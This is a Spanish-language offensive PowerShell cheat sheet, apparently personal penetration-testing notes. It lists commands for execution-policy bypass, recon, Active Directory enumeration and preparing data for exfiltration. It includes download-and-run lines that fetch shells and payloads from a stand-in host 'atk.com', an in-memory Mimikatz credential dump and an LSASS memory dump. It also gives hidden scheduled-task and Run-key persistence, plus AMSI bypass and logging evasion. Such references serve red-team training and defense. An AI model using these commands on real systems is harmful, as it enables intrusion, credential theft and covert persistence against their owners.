# Políticas

| **Comando / Técnica** | **Función**                                  | **Ejemplo de Sintaxis**                              |
| --------------------- | -------------------------------------------- | ---------------------------------------------------- |
| `Get-ExecutionPolicy` | Verifica la política actual.                 | `Get-ExecutionPolicy -List`                          |
| `Set-ExecutionPolicy` | Cambia la política (requiere Admin).         | `Set-ExecutionPolicy Bypass -Scope Process`          |
| `Bypass Execution`    | Ejecuta un script saltándose la política.    | `powershell.exe -ExecutionPolicy Bypass -File s.ps1` |
| `EncodedCommand`      | Ejecuta comandos en Base64 (evasión de IDS). | `powershell -enc SUVYIChOZXctT2JqZWN0...`            |
| `$PSVersionTable`     | Muestra la versión de PowerShell.            | `$PSVersionTable.PSVersion`                          |

# Recon

|**Parámetro / Cmdlet**|**Función**|**Ejemplo de Sintaxis**|
|---|---|---|
|`whoami /priv`|Muestra los privilegios del token actual.|`whoami /priv`|
|`Get-LocalUser`|Lista usuarios locales.|`Get-LocalUser \| Select-Object Name, Enabled`|
|`Get-WmiObject`|Obtiene información de parches/hotfixes.|`Get-WmiObject -Class "win32_quickfixengineering"`|
|`Get-Process`|Lista procesos y servicios activos.|`Get-Process \| Where-Object {$_.Description -ne ""}`|

# Red

| **Parámetro / Cmdlet** | **Función**                                    | **Ejemplo de Sintaxis**                                  |
| ---------------------- | ---------------------------------------------- | -------------------------------------------------------- |
| `Test-NetConnection`   | Escaneo de puertos básico (sustituto de nc).   | `Test-NetConnection -ComputerName 192.168.1.1 -Port 445` |
| `Get-NetIPAddress`     | Muestra la configuración de IP detallada.      | `Get-NetIPAddress -AddressFamily IPv4`                   |
| `Get-NetTCPConnection` | Lista conexiones y puertos abiertos (netstat). | `Get-NetTCPConnection -State Established`                |
| `DNS Enumeration`      | Resuelve un nombre de host.                    | `[System.Net.Dns]::GetHostAddresses("google.com")`       |

# Ejecución remota

| **Técnica**            | **Función**                                    | **Ejemplo de Sintaxis**                                                                     |
| ---------------------- | ---------------------------------------------- | ------------------------------------------------------------------------------------------- |
| `DownloadFile`         | Descarga un archivo a disco.                   | `(New-Object System.Net.WebClient).DownloadFile("http://atk.com/nc.exe", "C:\temp\nc.exe")` |
| `IEX (DownloadString)` | Ejecuta un script directamente en memoria.     | `IEX (New-Object System.Net.WebClient).DownloadString('http://atk.com/shell.ps1')`          |
| `Invoke-WebRequest`    | Descarga de archivos (similar a curl).         | `iwr -Uri http://atk.com/p.exe -OutFile C:\temp\p.exe`                                      |
| `Invoke-Command`       | Ejecuta comandos en una sesión remota (WinRM). | `Invoke-Command -ComputerName SRV01 -ScriptBlock {whoami}`                                  |
| `Enter-PSSession`      | Inicia una sesión interactiva remota.          | `Enter-PSSession -ComputerName Target_IP -Credential user`                                  |

# AD

| **Acción**        | **Función**                                      | **Ejemplo de Sintaxis**              |
| ----------------- | ------------------------------------------------ | ------------------------------------ |
| `Get-NetDomain`   | Obtiene información del dominio actual.          | `Get-NetDomain`                      |
| `Get-NetUser`     | Lista todos los usuarios del dominio.            | `Get-NetUser \| select cn, memberof` |
| `Get-NetComputer` | Lista las máquinas del dominio.                  | `Get-NetComputer -FullData`          |
| `Get-NetGroup`    | Lista grupos de seguridad.                       | `Get-NetGroup -GroupName "*Admin*"`  |
| `Find-LocalAdmin` | Busca máquinas donde el usuario actual es admin. | `Find-LocalAdminAccess`              |
| `Get-NetLoggedOn` | Muestra quién está logueado en una máquina.      | `Get-NetLoggedOn -ComputerName PC01` |

# Exfil
|**Comando**|**Función**|**Ejemplo de Sintaxis**|
|---|---|---|
|`Select-String`|Busca cadenas de texto (grep).|`dir -r \| Select-String "password"`|
|`Export-Csv`|Exporta resultados a formato CSV.|`Get-Process \| Export-Csv -Path ./procs.csv`|
|`ConvertTo-Json`|Convierte objetos a formato JSON para API.|`Get-Service \| ConvertTo-Json`|
|`Compress-Archive`|Comprime archivos para exfiltración.|`Compress-Archive -Path C:\Confidencial -DestinationPath C:\temp\data.zip`|

# Fundamentos del lenguaje

| Concepto | Sintaxis | Ejemplo |
|----------|----------|---------|
| Variable | `$nombre = valor` | `$x = 5` |
| Pipeline | `cmd1 \| cmd2` | `Get-Process \| Sort-Object CPU` |
| Filtrar | `Where-Object {…}` (`?`) | `gps \| ? {$_.CPU -gt 100}` |
| Proyectar | `Select-Object` (`select`) | `gps \| select Name, Id` |
| Iterar | `ForEach-Object {…}` (`%`) | `1..5 \| % { $_ * 2 }` |
| Condicional | `if () {} elseif () {} else {}` | `if ($x -gt 0) { "pos" }` |
| Bucle | `foreach ($i in $c) {}` | `foreach ($f in dir) { $f.Name }` |
| Operadores | `-eq -ne -gt -lt -like -match` | `$s -match '^\d+$'` |
| Ayuda | `Get-Help`, `Get-Member` | `gps \| Get-Member` |

> Alias útiles: `gps`=Get-Process, `gci`/`dir`/`ls`=Get-ChildItem, `iwr`=Invoke-WebRequest, `iex`=Invoke-Expression, `gc`/`cat`=Get-Content.

# Credenciales

| Técnica | Ejemplo |
|---------|---------|
| Credencial en memoria | `$c = Get-Credential` |
| PSCredential desde texto | `$p = ConvertTo-SecureString 'pass' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('user',$p)` |
| Credenciales guardadas | `cmdkey /list` |
| DPAPI / Vault | `Get-ChildItem` en `%APPDATA%\Microsoft\Credentials` |
| Buscar passwords | `Get-ChildItem -Recurse -Include *.config,*.xml \| Select-String "password"` |
| Mimikatz (en memoria) | `IEX(IWR -UseBasicParsing http://atk/Invoke-Mimikatz.ps1); Invoke-Mimikatz -DumpCreds` |
| LSASS dump | `rundll32 comsvcs.dll, MiniDump <PID> C:\temp\l.dmp full` |

# Persistencia

| Vector | Sintaxis |
|--------|----------|
| Tarea programada | `Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute powershell.exe -Argument '-c ...') -Trigger (New-ScheduledTaskTrigger -AtLogon) -TaskName upd` |
| Run key (registro) | `Set-ItemProperty 'HKCU:\...\Run' -Name x -Value 'powershell -w hidden -c ...'` |
| Perfil de PowerShell | Añadir comando a `$PROFILE` |
| Servicio | `New-Service -Name svc -BinaryPathName '...'` |
| WMI event subscription | `Register-WmiEvent` (sin fichero en disco) |

# Evasión

| Técnica | Sintaxis / nota |
|---------|-----------------|
| Modo oculto | `powershell -w hidden -nop -ep bypass -c ...` |
| `-nop` / `-noni` | No cargar perfil / no interactivo |
| AMSI bypass | Parchear `AmsiUtils.amsiInitFailed` por reflexión (firmas cambian; ofuscar) |
| Comando codificado | `powershell -enc <Base64-UTF16LE>` |
| Constrained Language Mode | Comprobar `$ExecutionContext.SessionState.LanguageMode` |
| Logging | Evitar **Script Block Logging** / **Transcription** / **Module Logging** |
| Descarga sin tocar disco | `IEX (New-Object Net.WebClient).DownloadString('http://atk/s.ps1')` |

> AMSI, ScriptBlock Logging y AppLocker/CLM son las defensas que hay que considerar antes de lanzar payloads. PowerShell 2.0 (`-version 2`) evade AMSI si está disponible (downgrade).

# Recursos
### [[DCsync]] · [[PowerView]]
### [PowerSploit / PowerView](https://github.com/PowerShellMafia/PowerSploit)
### [HackTricks — Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
### [PayloadsAllTheThings — PowerShell](https://github.com/swisskyrepo/PayloadsAllTheThings)